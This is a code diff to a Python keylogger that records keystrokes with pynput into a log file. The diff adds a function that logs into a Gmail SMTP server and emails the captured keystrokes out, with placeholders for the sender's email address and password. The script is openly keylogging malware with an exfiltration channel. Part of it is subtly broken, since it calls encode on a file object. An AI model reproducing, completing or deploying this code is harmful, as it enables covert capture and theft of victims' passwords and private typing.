@@ -1,4 +1,5 @@
 import pynput.keyboard
+import smtplib
 
 log = open("logs.txt", "w")
 
@@ -34,9 +35,19 @@ def callback_function(key):
         log.flush()
 
 
+def send_email(email,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,email,message)
+    email_server.quit()
+
+
+
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
     keylogger_listener.join()
+    send_email("your mail @gmail.com", 'your password' , log.encode('utf-8'))
 
 log.close()
     
